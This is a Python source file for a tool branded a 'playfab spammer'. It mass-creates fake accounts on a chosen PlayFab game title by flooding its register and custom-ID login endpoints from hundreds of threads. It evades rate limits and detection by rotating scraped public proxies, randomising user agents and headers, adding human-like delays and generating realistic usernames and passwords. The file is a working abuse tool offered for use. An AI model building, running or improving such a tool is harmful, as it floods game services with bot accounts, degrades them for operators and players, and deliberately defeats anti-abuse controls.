import os
import re
import random
import string
import threading
import time
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("missing requests - run installer.bat")
    raise SystemExit(1)

from rich.console import Console, Group
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.align import Align
from rich.live import Live
from rich.text import Text
from rich.status import Status

WATERMARK = "@holy.niko"
DISCORD = "https://discord.gg/MYa937g4wq"
VERSION = "v1.0.0"

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
]

PROXY_RE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})")

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "UnityPlayer/2021.3.15f1 (UnityWebRequest/1.0, libcurl/7.84.0-DEV)",
    "UnityPlayer/2022.3.10f1 (UnityWebRequest/1.0, libcurl/8.0.1-DEV)",
]

LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.8,de;q=0.6",
    "en-US,en;q=0.9,es;q=0.7",
    "en-US,en;q=0.9,fr;q=0.7",
]

ADJ = ["shadow","nova","dark","wild","ghost","iron","storm","night","frost","blaze","crypt","lunar","savage","toxic","void","rapid","silent","lucky","astro","pixel","neon","onyx","rusty","sneaky","dizzy","funky","turbo","cosmic","midnight","golden"]
NOUN = ["wolf","fox","cat","tiger","dragon","panda","ninja","hunter","king","legend","sniper","rider","bear","eagle","shark","viper","crow","owl","ghost","bandit","wizard","pirate","samurai","viking","phantom","reaper","rogue","titan","cobra","falcon"]
WORDS = ["Shadow","Nova","Storm","Ghost","Iron","Wolf","Dragon","Night","Frost","Blaze","Lunar","Savage","Pixel","Neon","Turbo","Cosmic","Hunter","Legend","Viper","Falcon"]

TITLE_ID = ""
COUNT = 5
THREADS = 200
USE_PROXIES = True

CHARS = string.ascii_letters + string.digits
PROXIES = []

SUCCESS = 0
FAILED = 0
SENT = 0
PROXY_ERRORS = 0
DONE_THREADS = 0
START_TIME = 0.0

LOCK = threading.Lock()
LOGS = deque(maxlen=200)

console = Console()

def set_title(t="niko"):
    try:
        if os.name == "nt":
            os.system("title niko")
    except Exception:
        pass

def set_icon():
    try:
        import ctypes
        base = os.path.dirname(os.path.abspath(__file__)) if "__file__" in globals() else os.getcwd()
        ico = os.path.join(base, "niko.ico")
        png = os.path.join(base, "niko.png")
        if not os.path.exists(ico) and os.path.exists(png):
            try:
                from PIL import Image
                im = Image.open(png)
                im.save(ico, sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)])
            except Exception:
                return
        if not os.path.exists(ico):
            return
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if not hwnd:
            return
        small = ctypes.windll.user32.LoadImageW(None, ico, 1, 16, 16, 0x0010)
        big = ctypes.windll.user32.LoadImageW(None, ico, 1, 32, 32, 0x0010)
        if small:
            ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 0, small)
        if big:
            ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 1, big)
    except Exception:
        pass

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def ts():
    return time.strftime("%H:%M:%S")

def add_log(msg):
    with LOCK:
        LOGS.append(f"[dim]{ts()}[/dim] {msg}")

def human_pause():
    if random.random() < 0.06:
        time.sleep(random.uniform(2.0, 5.0))
    else:
        time.sleep(random.uniform(0.25, 1.25))

def human_name():
    a = random.choice(ADJ)
    n = random.choice(NOUN)
    sep = random.choice(["", "", "_", "_", "x"])
    num = str(random.randint(7, 99999)) if random.random() < 0.85 else ""
    pre = random.choice(["", "", "", "", "xX_", "itz_", "the_", "real_"])
    suf = random.choice(["", "", "", "", "_yt", "_ttv", "_god", "007"])
    name = f"{pre}{a}{sep}{n}{num}{suf}"
    r = random.random()
    if r < 0.2:
        name = name[:1].upper() + name[1:]
    elif r < 0.3:
        name = name.capitalize()
    while len(name) > 16:
        if suf:
            suf = ""
            name = f"{pre}{a}{sep}{n}{num}{suf}"
        elif pre:
            pre = ""
            name = f"{pre}{a}{sep}{n}{num}{suf}"
        elif num:
            num = num[:-1]
            name = f"{pre}{a}{sep}{n}{num}{suf}"
        else:
            name = name[:16]
    if len(name) < 3:
        name = name + str(random.randint(100, 999))
    return name

def human_password():
    w = random.choice(WORDS)
    if random.random() < 0.5:
        w = w.lower()
    tail = "".join(random.choice(CHARS) for _ in range(random.randint(2, 5)))
    num = str(random.randint(10, 9999))
    sym = random.choice(["!", ".", "_", "-", "*", "#", "@"])
    parts = [w, num, tail]
    random.shuffle(parts)
    pwd = "".join(parts)
    if random.random() < 0.7:
        pos = random.randint(1, max(len(pwd) - 1, 1))
        pwd = pwd[:pos] + sym + pwd[pos:]
    else:
        pwd = pwd + sym
    return pwd[:24]

def human_id():
    return "%032x" % random.getrandbits(128)

def human_headers(extra=None):
    h = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(UAS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(LANGS),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    if extra:
        h.update(extra)
    return h

def get_proxy():
    if not USE_PROXIES or not PROXIES:
        return None
    try:
        return random.choice(PROXIES)
    except Exception:
        return None

def fetch_proxies():
    global PROXIES
    found = set()
    if os.path.exists("proxies.txt"):
        try:
            with open("proxies.txt", "r", encoding="utf-8", errors="ignore") as f:
                for m in PROXY_RE.findall(f.read()):
                    found.add(m.strip())
            if found:
                add_log(f"[cyan]loaded {len(found)} proxies from proxies.txt[/cyan]")
        except Exception as e:
            add_log(f"[yellow]proxies.txt read fail: {e}[/yellow]")

    with Status("[cyan]fetching public proxies...[/cyan]", console=console, spinner="dots") as st:
        for src in PROXY_SOURCES:
            try:
                st.update(f"[cyan]fetching[/cyan] [dim]{src[:64]}...[/dim]")
                r = requests.get(src, timeout=15, headers={"User-Agent": random.choice(UAS)})
                if r.status_code != 200 or not r.text:
                    continue
                matches = PROXY_RE.findall(r.text)
                before = len(found)
                for m in matches:
                    found.add(m.strip())
                add_log(f"[dim]source ok[/dim] [cyan]{len(matches)}[/cyan] [dim]from {src.split('/')[2]} (+{len(found)-before})[/dim]")
            except Exception as e:
                add_log(f"[dim]source fail {src.split('/')[2]}: {str(e)[:60]}[/dim]")
                continue

    PROXIES = list(found)
    random.shuffle(PROXIES)
    if PROXIES:
        add_log(f"[green]● {len(PROXIES)} public proxies ready[/green]")
    else:
        add_log("[red]! no proxies loaded - running direct[/red]")
    return PROXIES

def banner():
    set_title()
    set_icon()
    clear()
    try:
        if os.name == "nt":
            os.system("chcp 65001 >nul 2>&1")
    except Exception:
        pass
    top = Text(f" ● {WATERMARK}  ", style="bold white") + Text(f"playfab spammer {VERSION}", style="cyan") + Text(f"   │   {DISCORD}   │   opencode-tui", style="dim")
    console.print(Panel(top, border_style="cyan", padding=(0, 1)))

    logo = (
        "[bold cyan]  ██╗  ██╗ ██████╗ ██╗  ██╗   ██╗[/bold cyan]\n"
        "[bold cyan]  ██║  ██║██╔═══██╗██║  ╚██╗ ██╔╝[/bold cyan]\n"
        "[bold white]  ███████║██║   ██║██║   ╚████╔╝ [/bold white]\n"
        "[bold magenta]  ██╔══██║██║   ██║██║    ╚██╔╝  [/bold magenta]\n"
        "[bold cyan]  ██║  ██║╚██████╔╝███████╗██║   [/bold cyan]\n"
        f"[dim]  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝   playfab spammer {VERSION}[/dim]"
    )
    left = Align.center(logo)
    right = Table.grid(padding=(0, 1))
    right.add_column()
    right.add_column()
    right.add_row("[dim]owner[/dim]", f"[bold white]{WATERMARK}[/bold white]")
    right.add_row("[dim]server[/dim]", f"[cyan]{DISCORD}[/cyan]")
    right.add_row("[dim]version[/dim]", f"[white]{VERSION}[/white]")
    grid = Table.grid(expand=True)
    grid.add_column(ratio=1)
    grid.add_column(ratio=1)
    grid.add_row(left, right)
    console.print(Panel(grid, border_style="dim", title="[dim]session[/dim]", title_align="left", subtitle=f"[dim]{WATERMARK}[/dim]"))

def ask_config():
    global TITLE_ID, COUNT, THREADS, USE_PROXIES
    console.print()
    console.print(Panel("[dim]configure your run — ENTER for defaults[/dim]", border_style="dim", title="[cyan]❯ config[/cyan]", title_align="left"))

    TITLE_ID = Prompt.ask("  [cyan]❯[/cyan] [white]TitleId[/white] [dim](e.g. 0B0C0)[/dim]", default="").strip()
    while not TITLE_ID:
        console.print("  [red]! TitleId is required[/red]")
        TITLE_ID = Prompt.ask("  [cyan]❯[/cyan] [white]TitleId[/white]", default="").strip()

    default_threads = str(min((os.cpu_count() or 4) * 25, 500))
    t = Prompt.ask("  [cyan]❯[/cyan] [white]Threads[/white]", default=default_threads).strip()
    c = Prompt.ask("  [cyan]❯[/cyan] [white]Count per thread[/white]", default="5").strip()
    try:
        THREADS = max(1, min(int(t), 2000))
    except ValueError:
        THREADS = int(default_threads)
    try:
        COUNT = max(1, min(int(c), 500))
    except ValueError:
        COUNT = 5

    USE_PROXIES = Confirm.ask("  [cyan]❯[/cyan] [white]Use public proxies?[/white]", default=True)

    total = THREADS * COUNT * 2
    console.print(Panel(
        f"[white]title[/white] [cyan]{TITLE_ID}[/cyan]  [dim]│[/dim]  [white]threads[/white] [cyan]{THREADS}[/cyan]  [dim]│[/dim]  [white]per-thread[/white] [cyan]{COUNT}[/cyan]  [dim]│[/dim]  [white]ops[/white] [cyan]{total}[/cyan]  [dim]│[/dim]  [white]proxies[/white] [green]{'ON' if USE_PROXIES else 'OFF'}[/green]",
        border_style="cyan", title="[cyan]❯ ready[/cyan]", title_align="left", subtitle=f"[dim]{WATERMARK}[/dim]"
    ))

def do_post(url, payload, session, extra_headers=None):
    global SUCCESS, FAILED, SENT, PROXY_ERRORS
    human_pause()
    headers = human_headers(extra_headers)
    proxy = get_proxy()
    proxies = None
    if proxy:
        hp = proxy if proxy.startswith("http") else f"http://{proxy}"
        proxies = {"http": hp, "https": hp}
    try:
        r = session.post(url, headers=headers, json=payload, proxies=proxies, timeout=random.uniform(8, 15))
        ok = r.status_code == 200 and ("PlayFabId" in r.text or '"code":200' in r.text or '"status":"OK"' in r.text or "SessionTicket" in r.text)
        with LOCK:
            SENT += 1
            if ok:
                SUCCESS += 1
            else:
                FAILED += 1
        return ok, (proxy or "direct"), r.status_code
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
        if proxy:
            with LOCK:
                PROXY_ERRORS += 1
        try:
            time.sleep(random.uniform(0.5, 2.0))
            r2 = session.post(url, headers=human_headers(extra_headers), json=payload, proxies=None, timeout=random.uniform(8, 15))
            ok2 = r2.status_code == 200 and ("PlayFabId" in r2.text or '"code":200' in r2.text)
            with LOCK:
                SENT += 1
                if ok2:
                    SUCCESS += 1
                else:
                    FAILED += 1
            return ok2, "direct-fallback", r2.status_code
        except Exception:
            with LOCK:
                SENT += 1
                FAILED += 1
            return False, (proxy or "direct"), -1
    except Exception:
        with LOCK:
            SENT += 1
            FAILED += 1
        return False, (proxy or "direct"), -1

def worker(url_reg, url_login, count):
    global DONE_THREADS
    time.sleep(random.uniform(0.05, 1.5))
    session = requests.Session()
    for _ in range(count):
        name = human_name()
        pwd = human_password()
        cid = human_id()
        d1 = {"TitleId": TITLE_ID, "Username": name, "Password": pwd, "RequireBothUsernameAndEmail": False, "CreateAccount": True, "CustomId": cid}
        ok1, px1, code1 = do_post(url_reg, d1, session)
        short1 = (px1.split(":")[0] if px1 else "direct")[:15]
        if ok1:
            add_log(f"[green]✔[/green] reg [white]{name}[/white] [dim]via {short1} {code1}[/dim]")
        else:
            if random.random() < 0.25:
                add_log(f"[red]✖[/red] reg [dim]{name} via {short1} {code1}[/dim]")

        time.sleep(random.uniform(0.3, 1.4))
        disp = human_name()
        cid2 = human_id()
        d2 = {"TitleId": TITLE_ID, "CustomId": cid2, "DisplayName": disp, "CreateAccount": True}
        ok2, px2, code2 = do_post(url_login, d2, session, {"X-PlayFabSDK": "PythonSdk-0.0.220411", "X-ReportErrorAsSuccess": "true"})
        short2 = (px2.split(":")[0] if px2 else "direct")[:15]
        if ok2:
            add_log(f"[green]✔[/green] login [white]{disp}[/white] [dim]via {short2} {code2}[/dim]")
        else:
            if random.random() < 0.25:
                add_log(f"[red]✖[/red] login [dim]{disp} via {short2} {code2}[/dim]")
        if random.random() < 0.12:
            time.sleep(random.uniform(1.0, 3.0))
    try:
        session.close()
    except Exception:
        pass
    with LOCK:
        DONE_THREADS += 1
    return True

def make_screen(progress, task_id):
    elapsed = max(time.time() - START_TIME, 0.01)
    with LOCK:
        s, f, sent, perr, done = SUCCESS, FAILED, SENT, PROXY_ERRORS, DONE_THREADS
        logs = list(LOGS)[-12:]
    rps = sent / elapsed

    header = Panel(
        Text(f" {WATERMARK}  │  {TITLE_ID}  │  {THREADS} threads  │  {len(PROXIES) if USE_PROXIES else 0} proxies ", style="bold white", justify="center"),
        border_style="cyan", padding=(0, 1)
    )

    stats = Table(expand=True, show_header=False, padding=(0, 1))
    stats.add_column(ratio=1, justify="center")
    stats.add_column(ratio=1, justify="center")
    stats.add_column(ratio=1, justify="center")
    stats.add_column(ratio=1, justify="center")
    stats.add_row(
        f"[green]✔ {s}[/green]\n[dim]success[/dim]",
        f"[red]✖ {f}[/red]\n[dim]failed[/dim]",
        f"[cyan]{rps:.1f}/s[/cyan]\n[dim]{sent} sent │ {elapsed:.0f}s[/dim]",
        f"[yellow]{perr}[/yellow]\n[dim]proxy errs[/dim]",
    )

    log_text = "\n".join(logs) if logs else "[dim]waiting for events...[/dim]"
    log_panel = Panel(log_text, border_style="magenta", title="[magenta]❯ live logs[/magenta]", title_align="left", subtitle=f"[dim]{WATERMARK} │ {DISCORD}[/dim]", padding=(0, 1))

    footer = Text(f" {WATERMARK} │ {DISCORD} │ Ctrl+C to stop ", style="dim", justify="center")

    return Group(header, Panel(stats, border_style="dim", padding=(0, 0)), progress, log_panel, footer)

def run():
    global SUCCESS, FAILED, SENT, PROXY_ERRORS, DONE_THREADS, START_TIME
    SUCCESS = FAILED = SENT = PROXY_ERRORS = DONE_THREADS = 0
    with LOCK:
        LOGS.clear()

    url_reg = f"https://{TITLE_ID}.playfabapi.com/Client/RegisterPlayFabUser"
    url_login = f"https://{TITLE_ID}.playfabapi.com/Client/LoginWithCustomID"

    if USE_PROXIES:
        fetch_proxies()
    else:
        add_log("[yellow]proxies disabled - direct mode[/yellow]")

    add_log(f"[cyan]▶ starting {THREADS} threads × {COUNT} on [white]{TITLE_ID}[/white][/cyan]")
    START_TIME = time.time()
    set_title()

    progress = Progress(SpinnerColumn(), TextColumn("  [cyan]❯[/cyan] [white]{task.description}[/white]"), BarColumn(bar_width=None), TextColumn("[cyan]{task.completed}/{task.total}[/cyan]"), TextColumn("[dim]{task.fields[info]}[/dim]"), TimeElapsedColumn(), expand=True)
    task_id = progress.add_task("spamming", total=THREADS, info="warming up...")

    try:
        with Live(make_screen(progress, task_id), console=console, refresh_per_second=8, transient=False) as live:
            with ThreadPoolExecutor(max_workers=THREADS) as ex:
                futs = [ex.submit(worker, url_reg, url_login, COUNT) for _ in range(THREADS)]
                for fut in as_completed(futs):
                    try:
                        fut.result()
                    except Exception as e:
                        add_log(f"[red]worker crash: {str(e)[:80]}[/red]")
                    elapsed = max(time.time() - START_TIME, 0.01)
                    with LOCK:
                        s, f_ = SUCCESS, FAILED
                    info = f"ok:{s} fail:{f_} {s/elapsed:.1f}/s"
                    progress.update(task_id, completed=DONE_THREADS, info=info)
                    set_title()
                    live.update(make_screen(progress, task_id))
    except KeyboardInterrupt:
        add_log("[yellow]! stopped by user[/yellow]")

    elapsed = time.time() - START_TIME
    console.print()
    done_tbl = Table.grid(padding=(0, 2))
    done_tbl.add_column()
    done_tbl.add_column()
    done_tbl.add_row("[green]● success[/green]", f"[bold white]{SUCCESS}[/bold white]")
    done_tbl.add_row("[red]● failed[/red]", f"[bold white]{FAILED}[/bold white]")
    done_tbl.add_row("[cyan]● sent[/cyan]", f"[white]{SENT}[/white]")
    done_tbl.add_row("[yellow]● proxy errors[/yellow]", f"[white]{PROXY_ERRORS}[/white]")
    done_tbl.add_row("[dim]time / rps[/dim]", f"[white]{elapsed:.1f}s / {SENT/max(elapsed,0.01):.1f}/s[/white]")
    done_tbl.add_row("[dim]proxies[/dim]", f"[white]{len(PROXIES) if USE_PROXIES else 0}[/white]")
    console.print(Panel(Align.center(done_tbl), title="[green]❯ done[/green]", subtitle=f"[dim]{WATERMARK} │ {DISCORD}[/dim]", border_style="green", padding=(1, 2)))
    set_title()

def main():
    banner()
    ask_config()
    run()
    console.print(f"\n[dim]press enter to exit...  {WATERMARK} │ {DISCORD}[/dim]")
    try:
        input("  ❯ ")
    except Exception:
        pass

if __name__ == "__main__":
    main()
